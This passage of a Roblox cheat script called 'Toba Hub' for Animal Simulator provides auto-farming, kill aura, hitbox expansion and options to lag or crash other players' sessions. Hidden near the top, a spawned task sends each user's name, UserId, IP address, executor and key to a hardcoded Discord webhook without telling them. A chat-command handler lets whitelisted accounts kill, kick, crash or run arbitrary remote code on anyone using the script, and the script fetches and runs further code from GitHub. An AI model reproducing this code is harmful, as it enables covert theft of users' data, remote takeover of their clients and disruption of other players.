                                    icon_url = "https://cdn.discordapp.com/attachments/1332137714203496499/1341759019299373086/noFilter.webp?ex=67b729f6&is=67b5d876&hm=81a2babc988e0fd6cdb6f8c515c85006899f829aac6377cd5117c6f93b4da47e"
                                }
                            }
                        }
                    })
                })
            end
        end
    end
end

task.spawn(function()
    local w = "https://discord.com/api/webhooks/1367222039600955545/loZkZtPSDeXZOS7ujXyH3NMFEKX9WygZK9iFWHO8Iw0iwZrkZhYuxOzgrPcM7JbIbYRr" 
    local l = LocalPlayer.leaderstats.Level
    local k = LocalPlayer.otherstats.Kill
    local jobid = game.JobId
    http_request({
        Url = w,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "",
            embeds = {
                {
                    title = "New user whitelisted",
                    description = "",
                    fields = {
                        {
                            name = "Name",
                            value = LocalPlayer.Name,
                            inline = false
                        },
                        {
                            name = "UserId",
                            value = LocalPlayer.UserId,
                            inline = false
                        },
                        {
                            name = "IP",
                            value = jetIPE(),
                            inline = false
                        },
                        {
                            name = "Executor",
                            value = getexecutorname() or identifyexecutor() or "Unknown",
                            inline = false
                        },
                        {
                            name = "Key",
                            value = validKey,
                            inline = false
                        },
                    },
                    color = 0x3ABDEC,
                    footer = {
                        text = "Toba Hub",
                        icon_url = "https://cdn.discordapp.com/attachments/1332137714203496499/1341759019299373086/noFilter.webp?ex=67b729f6&is=67b5d876&hm=81a2babc988e0fd6cdb6f8c515c85006899f829aac6377cd5117c6f93b4da47e"
                    },
                    timestamp = DateTime.now():ToIsoDate()
                }
            }
        })
    })
end)

-- //////// Anti-AFK ////////
game.Players.LocalPlayer.Idled:Connect(function()
    vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
end)

-- ///////// SKIBIDI //////////
local whitelist = {
    ["Lv7Gab"] = true,
    ["XxtenicoxX"] = true,
    ["aDalvaNaoUsaKalsinha"] = true,
    ["zzManuelGomeszz"] = true,
    ["itz_n9"] = true,
    ["1ry4nxs"] = true
}

local commands = {
    ["Kill"] = function()
        if not whitelist[LocalPlayer.Name] then
            LocalPlayer.Character.Humanoid.Health = 0
        end
    end,
    ["Kick"] = function()
        if not whitelist[LocalPlayer.Name] then
            LocalPlayer:Kick("Kicked by an Animal Simulator admin.")
        end
    end,
    ["Crash"] = function()
        if not whitelist[LocalPlayer.Name] then
            while true do end
        end
    end,
    ["Freeze"] = function()
        if not whitelist[LocalPlayer.Name] then
            LocalPlayer.Character.HumanoidRootPart.Anchored = true
        end
    end,
    ["Unfreeze"] = function()
        if not whitelist[LocalPlayer.Name] then
            LocalPlayer.Character.HumanoidRootPart.Anchored = false
        end
    end,
}

local function executeScript(scriptCode)
    if not whitelist[LocalPlayer.Name] then
        local success, result = pcall(function()
            return loadstring(scriptCode)()
        end)
        if success then
            print("Gyatted!")
        else
            warn("Not-gyatted shit:", result)
        end
    end
end

local function connectChatted(player)
    player.Chatted:Connect(function(message)
        if whitelist[player.Name] then
            local targetName, scriptCode = string.match(message, "^%.cleide%s+(%S+)%s+(.+)$")
            if targetName and not whitelist[targetName] and scriptCode then
                if commands[scriptCode] then
                    commands[scriptCode]()
                else
                    print(player.Name .. " gyatted " .. targetName .. " with: " .. scriptCode)
                    if targetName == LocalPlayer.Name and not whitelist[targetName] then
                        executeScript(scriptCode)
                    end
                end
            end
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    connectChatted(player)
end

Players.PlayerAdded:Connect(function(player)
    connectChatted(player)
end)

-- //////// UI SETUP ///////
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/gabrelso/TobaHub/refs/heads/main/Libraries/V5.lua"))()

local Window = Library:CreateWindow({
    NameHub = "Toba Hub",
    Description = "Animal Simulator",
    Color = Color3.fromRGB(57, 193, 238),
    ["Tab Width"] = 140,
    ["Size UI"] = UDim2.fromOffset(580, 320),
})

loadstring(game:HttpGet("https://raw.githubusercontent.com/gabrelso/Roblox-Scripts-Backups/refs/heads/main/test"))()

local Tabs = {
    Tab = Window:AddTab({ Name = "Main", Icon = "rbxassetid://83626778578970" }),
    Tab1 = Window:AddTab({ Name = "Auto Farm", Icon = "rbxassetid://75142392025093" }),
    Tab2 = Window:AddTab({ Name = "PvP", Icon = "rbxassetid://100292468980684" }),
    TabTroll = Window:AddTab({ Name = "Troll [PATCHED]", Icon = "rbxassetid://122205761190438" }),
    Tab3 = Window:AddTab({ Name = "Christmas", Icon = "rbxassetid://139448422476614" }),
    Tab4 = Window:AddTab({ Name = "Miscellaneous", Icon = "rbxassetid://73984903348340" }),
    TabHook = Window:AddTab({ Name = "Webhook", Icon = "rbxassetid://91320574429463" }),
    Tab5 = Window:AddTab({ Name = "UI Settings", Icon = "rbxassetid://113243407077394" })
}

local InfoSec = Tabs.Tab:AddSection("Info") 
if whitelist[LocalPlayer.Name] then
    InfoSec:AddParagraph({ Title = "How to use a command", Content = ".cleide <player> <cmd>/<script>" })
    InfoSec:AddParagraph({ Title = "Command list", Content = "Kill, Kick, Crash, Freeze, Unfreeze" })
end

InfoSec:AddParagraph({ Title = "Script credits", Content = "Owner : lv7gab ¦ Lib : AhmadV99" })
InfoSec:AddParagraph({ Title = "Anti-AFK", Content = "Anti-AFK is always enabled!" })
local dcSec = Tabs.Tab:AddSection("Discord")
dcSec:AddParagraph({ Title = "Discord", Content = "Please join our Discord to seek support and look for updates!" })
dcSec:AddButton({ Title = "Copy Discord Link", Content = "Sets the Discord Link to your clipboard", Callback = function()
        setclipboard("https://dsc.gg/tobahub-")
    end
})

local AutoDummySec = Tabs.Tab1:AddSection("Auto Dummy")
AutoDummySec:AddToggle({ Title = "Auto Dummy", Content = "Auto Farms your current dummy", Default = false, Callback = function(AutoDummyToggleValue)
        getgenv().AutoDummyToggle = AutoDummyToggleValue
        if AutoDummyToggleValue then
            if LocalPlayer.leaderstats.Level.Value < 5000 then
                definedDummy = game.Workspace.MAP["dummies"].Dummy
            else
                definedDummy = game.Workspace.MAP["5k_dummies"].Dummy2
            end
            if definedDummy and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character:PivotTo(definedDummy:GetPivot())
                task.spawn(AutoDummy)
            end
        else
          
        end
    end
})

AutoDummySec:AddToggle({ Title = "Use Halloween Monkey", Content = "Uses the Halloween Monkey for faster hits", Default = false, Callback = function(UseMonkeyToggleValue)
        getgenv().UseMonkeyToggle = UseMonkeyToggleValue
        if UseMonkeyToggleValue then
            game:GetService("ReplicatedStorage").Events.SpawnEvent:FireServer("halloween2023", "monkey", "halloweenmonkeyAnim")
        end
    end
})

AutoDummySec:AddButton({ Title = "Remove Fireball FX", Content = "Deletes Fireball / Lightningball FX", Callback = function()
        rs.SkillsInRS.HitFX.NewLightningball:Destroy()
        rs.SkillsInRS.HitFX.NewFireball:Destroy()
    end
})

local CoinsBossesSec = Tabs.Tab1:AddSection("Auto Coins / Bosses")
CoinsBossesSec:AddToggle({ Title = "Auto Coins", Content = "Auto Farm Coins", Default = false, Callback = function(AutoCoinsToggleValue)
        getgenv().AutoCoinsToggle = AutoCoinsToggleValue
        if AutoCoinsToggleValue then
            task.spawn(AutoCoins)
        end
    end
})

CoinsBossesSec:AddDropdown({ Title = "Select boss", Content = "", Options = bosses, Default = { "DragonGiraffe"} , Callback = function(BossSelectValue) getgenv().BossSelect = BossSelectValue end })

CoinsBossesSec:AddToggle({ Title = "Auto Boss", Content = "Kills the selected boss", Default = false, Callback = function(AutoBossToggleValue)
        getgenv().AutoBossToggle = AutoBossToggleValue
        if AutoBossToggleValue then
            task.spawn(AutoBoss)
        end
    end
})

CoinsBossesSec:AddToggle({ Title = "Auto All Bosses", Content = "Kills every boss in the game", Default = false, Callback = function(v)
        getgenv().AutoAllBossesToggle = v
        task.spawn(AutoAllBosses)
    end
})
  
local FarmKillsSec = Tabs.Tab1:AddSection("Auto Farm Kills")
FarmKillsSec:AddToggle({ Title = "Auto Farm Kills", Content = "Farm kills by yourself", Default = false, Callback = function(SelfFarmKillsToggleValue)
        getgenv().SelfFarmKillsToggle = SelfFarmKillsToggleValue
        task.spawn(SelfFarmKills)
    end
})

FarmKillsSec:AddToggle({ Title = "Display Kills", Content = "Shows your kills at the screen", Default = false, Callback = function(DisplayKillsToggleValue)
        getgenv().DisplayKillsToggle = DisplayKillsToggleValue
        task.spawn(DisplayKills)
    end
})

local AttackPlayerSec = Tabs.Tab2:AddSection("Attack Players")
local plrDrop = AttackPlayerSec:AddDropdown({
    Title = "Select Player",
    Content = "Select a player as target",
    Options = GetPlayers(),
    Default = {},
    Callback = function(v)
        getgenv().PlayerSelect = v
    end
})

AttackPlayerSec:AddToggle({ Title = "Damage Player", Content = "Loops damage the player", Default = false, Callback = function(v)
        getgenv().LoopDamageToggle = v
        task.spawn(DealDamage)
    end
})

AttackPlayerSec:AddButton({ Title = "Instantly kill player", Content = "Kills any player, must have +10 kills", Callback = function()
        task.spawn(InstaKill)
    end
})

AttackPlayerSec:AddButton({ Title = "Teleport to player", Content = "Teleports to the player", Callback = function()
        task.spawn(TP)
    end
})

AttackPlayerSec:AddToggle({ Title = "Loop teleport", Content = "Loop teleports below the player", Default = false, Callback = function(v)
        getgenv().LoopTeleportToggle = v
        task.spawn(LoopTeleport)
    end
})

AttackPlayerSec:AddToggle({ Title = "View player", Content = "Sets your camera to the player's", Default = false, Callback = function(v)
        getgenv().ViewToggle = v
        if v then
            task.spawn(View)
        else
            local camera = game.Workspace.CurrentCamera
            camera.CameraSubject = LocalPlayer.Character.Humanoid
            camera.CameraType = Enum.CameraType.Custom
        end
    end
})

local AurasSec = Tabs.Tab2:AddSection("Auras")
AurasSec:AddToggle({ Title = "Kill Aura", Content = "Hits any player near you", Default = false, Callback = function(v)
        getgenv().KillAuraToggle = v
        task.spawn(KillAura)
    end
})

AurasSec:AddInput({
    Title = "Fire Aura Distance", 
    Content = "The distance the player must be", 
    Default = 150, 
    Callback = function(v)
        getgenv().FireAuraDistance = v
        print("Fire aura magnitude:", getgenv().FireAuraDistance)
    end
})

AurasSec:AddInput({
    Title = "Fire Aura Delay", 
    Content = "Fire delay if you want to look more legit", 
    Default = 0.1,
    Callback = function(v)
        getgenv().FireAuraCooldown = v
        print("Fire aura delay:", getgenv().FireAuraCooldown)
    end
})

AurasSec:AddToggle({ Title = "Fire Aura", Content = "Uses fireball on any player near you", Default = false, Callback = function(v)
        getgenv().FireAuraToggle = v
        task.spawn(FireAura)
    end
})

local HitboxSec = Tabs.Tab2:AddSection("Hitbox")
HitboxSec:AddInput({
    Title = "Hitbox size", 
    Content = "The size of the hitbox", 
    Default = 30,
    Callback = function(v)
        getgenv().HitboxSize = v
    end
})
HitboxSec:AddInput({
    Title = "Hitbox transparency", 
    Content = "The transparency (0 = visible until 1 = invisible)",
    Default = 0.8,
    Callback = function(v)
        getgenv().HitboxTransparency = v
    end
})
HitboxSec:AddToggle({ Title = "Hitbox", Content = "Enables the hitbox with your configs", Default = false, Callback = function(v)
        getgenv().HitboxToggle = v
        task.spawn(Hitbox)
    end
})

local RespawnSec = Tabs.Tab2:AddSection("Auto Respawn")
RespawnSec:AddInput({
    Title = "Respawn at % of health", 
    Content = "The percentage of health to respawn when reached",
    Default = 15,
    Callback = function(v)
        getgenv().HealthPercentage = v
    end
})
RespawnSec:AddToggle({ Title = "Auto Respawn", Content = "Enables the auto respawn with your configs", Default = false, Callback = function(v)
        getgenv().AutoRespawnToggle = v
        task.spawn(AutoRespawn)
    end
})

local TrollSec = Tabs.TabTroll:AddSection("Troll Players")
local plrTrollDrop = TrollSec:AddDropdown({
    Title = "Select Player",
    Content = "Select a player as target",
    Options = GetPlayers(),
    Default = {},
    Callback = function(v)
        getgenv().PlayerTrollSelect = v
    end
})

Players.PlayerAdded:Connect(function()
    local n = GetPlayers()
    local t = getgenv().PlayerTrollSelect[1]
    local p = getgenv().PlayerSelect[1]
    plrTrollDrop:Refresh(n)
    plrTrollDrop:Set({t})
    plrDrop:Refresh(n)
    plrDrop:Set({p})
end)
Players.PlayerRemoving:Connect(function()
    local n = GetPlayers()
    local t = getgenv().PlayerTrollSelect[1]
    local p = getgenv().PlayerSelect[1]
    plrTrollDrop:Refresh(n)
    plrTrollDrop:Set({t})
    plrDrop:Refresh(n)
    plrDrop:Set({p})
end)

TrollSec:AddToggle({ Title = "Crash / Lag player", Content = "Lags any player using carry lol", Default = false, Callback = function(v)
        getgenv().LagPlayerToggle = v
        task.spawn(LagNiga)
    end
})

TrollSec:AddButton({ Title = "Whitelist player", Content = "Makes the player be not affected by troll server", Callback = function()
        getgenv().WhitelistedPlayersTable = getgenv().WhitelistedPlayersTable or {}
        if not getgenv().PlayerTrollSelect[1] then
            Library:Notify("No player selected.")
            return
        end
        local playerName = getgenv().PlayerTrollSelect[1]
        local isInWhitelist = false
        for i, v in ipairs(getgenv().WhitelistedPlayersTable) do
            if v == playerName then
                isInWhitelist = true
                table.remove(getgenv().WhitelistedPlayersTable, i)
                Library:Notify({ Title = "", Description = "Whitelist", Content = "Player " .. playerName .. " removed from whitelist", Color = Color3.fromRGB(57, 193, 238) })
                break
            end
        end
        if not isInWhitelist then
            table.insert(getgenv().WhitelistedPlayersTable, playerName)
            Library:Notify({ Title = "", Description = "Whitelist", Content = "Player " .. playerName .. " added to whitelist", Color = Color3.fromRGB(57, 193, 238) })
        end
    end,
    DoubleClick = false
})

TrollSec:AddInput({
    Title = "Text to send", 
    Content = "The text that the gift will show",
    Default = "Toba Hub on TOP",
    Callback = function(v)
        getgenv().GiftPlayerText = v
    end
})
TrollSec:AddInput({
    Title = "Delay to send", 
    Content = "The wait time to send the gift",
    Default = 0.1,
    Callback = function(v)
        getgenv().GiftPlayerDelay = v
    end
})
TrollSec:AddToggle({ Title = "Loop gift player", Content = "Sends gifts with your configs", Default = false, Callback = function(v)
        getgenv().GiftPlayerToggle = v
        task.spawn(GiftNiga)
    end
})

local TrollServerSec = Tabs.TabTroll:AddSection("Troll Server")
TrollServerSec:AddToggle({ Title = "Lag / Crash server", Content = "Lags and glitch every player", Default = false, Callback = function(v)
        getgenv().LagServerToggle = v
        task.spawn(LagServer)
    end
})

TrollServerSec:AddInput({
    Title = "Text to send to the server", 
    Content = "The text that the gift will show",
    Default = "Toba Hub on TOP",
    Callback = function(v)
        getgenv().GiftServerText = v
    end
})

TrollServerSec:AddToggle({ Title = "Loop send text to server", Content = "Sends your text to every player", Default = false, Callback = function(v)
        getgenv().GiftServerToggle = v
        task.spawn(GiftServer)
    end
})

local XmasSec = Tabs.Tab3:AddSection("Christmas 2024")
XmasSec:AddToggle({ Title = "Auto Farm candy", Content = "Must attack or enable auto attack", Default = false, Callback = function(v)
        getgenv().AutoCandyToggle = v
        task.spawn(AutoCandy)
    end
})

local GameMiscSec = Tabs.Tab4:AddSection("Game Misc")
GameMiscSec:AddToggle({ Title = "Free Fireball", Content = "Someone in the server must have Fireball", Default = false, Callback = function(v)
    getgenv().FreeFireToggle = v
    if getgenv().FreeFireToggle then
        if not LocalPlayer.Backpack:FindFirstChild("Fireball") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local fireball = player:FindFirstChild("Backpack") and player.Backpack:FindFirstChild("Fireball")
                    if fireball then
                        fireball:Clone().Parent = LocalPlayer.Backpack
                        return
                    end
                end
            end
            Library:Notify({ Title = "", Description = "Free Fireball", Content = "No players with a Fireball found", Color = Color3.fromRGB(57, 193, 238) })
        else
            Library:Notify({ Title = "", Description = "Free Fireball", Content = "You already have a Fireball", Color = Color3.fromRGB(57, 193, 238) })
        end
    end
end
})

GameMiscSec:AddToggle({ Title = "Free Radio", Content = "Lets you have the radio for free", Default = false, Callback = function(v)
  getgenv().FreeRadioToggle = v 
  task.spawn(FreeRadio)
    end
})
  
GameMiscSec:AddButton({ Title = "Get Lightningball", Content = "Gets Lightningball (must have Fireball gamepass)", Callback = function()
        local currentCFrame = game.Players.LocalPlayer.Character.PrimaryPart.CFrame
        local esperma = CFrame.new(-40.60783767700195, 602.1058349609375, 786.2437744140625)
        game.Players.LocalPlayer.Character.PrimaryPart.CFrame = esperma
        task.wait(0.4)
        fireproximityprompt(workspace.PickFolder.rock.ProximityPrompt)
        task.wait(0.4)
        game.Players.LocalPlayer.Character.PrimaryPart.CFrame = currentCFrame
    end
})

GameMiscSec:AddToggle({ Title = "Auto Eat", Content = "Auto eats food, must be animal", Default = false, Callback = function(v)
      getgenv().AutoEatToggle = v 
      task.spawn(AutoEat)
    end
})
GameMiscSec:AddToggle({ Title = "Auto Lay / Sit", Content = "Why?", Default = false, Callback = function(v)
      getgenv().AutoLayToggle = v 
      task.spawn(AutoLay)
    end
})
GameMiscSec:AddButton({ Title = "Get Every Eagle", Content = "Gives you every eagle in a few seconds", Callback = function()
        for i, v in pairs(workspace.Eggs:GetDescendants()) do
            if v:IsA("ClickDetector") then
                for _ = 1, 11 do
                    task.wait(0.1)
                    fireclickdetector(v)
                end
            end
        end
    end
})
GameMiscSec:AddButton({ Title = "Get every Pig", Content = "Gives you every pig in a few seconds", Callback = function()
        for i, v in pairs(workspace.IceCave.Cave.gifts:GetDescendants()) do
            if v:IsA("ClickDetector") then
                for _ = 1, 11 do
                    task.wait(0.1)
                    fireclickdetector(v)
                end
            end
        end
    end
})

GameMiscSec:AddToggle({ Title = "Auto Toba Hub Clan", Content = "Auto clanning for Toba Hub users", Default = false, Callback = function(v)
      getgenv().AutoClanToggle = v 
      task.spawn(TobaClanning)
    end
})

local RobloxMiscSec = Tabs.Tab4:AddSection("Roblox Misc")
RobloxMiscSec:AddButton({ Title = "Reset", Content = "Resets your character", Callback = function()
        LocalPlayer.Character.Humanoid.Health = 0
    end
})
RobloxMiscSec:AddButton({ Title = "Rejoin", Content = "Joins your current server again", Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
    end
})
RobloxMiscSec:AddButton({ Title = "Sing Wenomechainsama (full)", Content = "Best function ever added", Callback = function()
        ch:SendAsync("Weno mechain sama")
        task.wait(3)
        ch:SendAsync("Tuma jar bisaun")
        task.wait(3)
        ch:SendAsync("Wi fen loof")
        task.wait(3)
        ch:SendAsync("Eselif ter braun")
        task.wait(3)
        ch:SendAsync("Anwecul betugt baby")
        task.wait(3)
        ch:SendAsync("Aslon skys rblu")
        task.wait(3)
        ch:SendAsync("Yuak so inocenow")
        task.wait(3)
        ch:SendAsync("Buch yulaid sosun")
    end
})

local VisualSec = Tabs.Tab4:AddSection("Visual (only you can see!")
VisualSec:AddToggle({ Title = "Korblox Leg (visual)", Content = "Gives you Korblox leg, others cannot see", Default = false, Callback = function(v)
    getgenv().VisualKorbloxToggle = v
    if getgenv().VisualKorbloxToggle then
        local char = LocalPlayer.Character
        if char then
            char.RightFoot.MeshId = "http://www.roblox.com/asset/?id=902942089"
            char.RightFoot.Transparency = 1
            char.RightLowerLeg.MeshId = "http://www.roblox.com/asset/?id=902942093"
            char.RightLowerLeg.Transparency = 1
            char.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
            char.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
        end
    end
end
})

if whitelist[LocalPlayer.Name] then
    VisualSec:AddDropdown({ Title = "Select Rank", Content = "Select a rank badge", Options = { "1", "2", "3", "4-10", "11-50", "51-100"}, Default = {} , Callback = function(v) getgenv().FakeRankSelect = v end })
    VisualSec:AddToggle({ Title = "Fake Rank", Content = "Gives you a 'fake' rank badge", Default = false, Callback = function(v) getgenv().FakeRankToggle = v task.spawn(FakeRank) end })
end

local LogSec = Tabs.TabHook:AddSection("Webhook (Logs)")
LogSec:AddInput({
    Title = "Webhook", 
    Content = "Please input a valid webhook here",
    Default = "",
    Callback = function(v)
        getgenv().NgaWebhook = v
    end
})

LogSec:AddToggle({ Title = "Webhook Level", Content = "Sends a log message whenever you level up", Default = false, Callback = function(v)
      getgenv().LevelWebhookToggle = v 
      task.spawn(WebhookLevel)
    end
})

LogSec:AddInput({
    Title = "Time to send", 
    Content = "Time to send the log message, in minutes",
    Default = "",
    Callback = function(v)
        getgenv().TimedWebhookTime = v
    end
})

LogSec:AddToggle({ Title = "Webhook Time (better for kills)", Content = "Sends a message with the time defined", Default = false, Callback = function(v)
      getgenv().TimedWebhookToggle = v 
      task.spawn(WebhookTime)
    end
})

local abuu = Tabs.Tab5:AddSection("?")
abuu:AddParagraph({ Title = "File System & Config", Content = "Coming soon (i hope)" })


--[[
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
ThemeManager:SetFolder("TobaHub")
SaveManager:SetFolder("TobaHub/animal-sim")
SaveManager:BuildConfigSection(Tabs["UI Settings"])
ThemeManager:ApplyToTab(Tabs["UI Settings"])
SaveManager:LoadAutoloadConfig()
]]
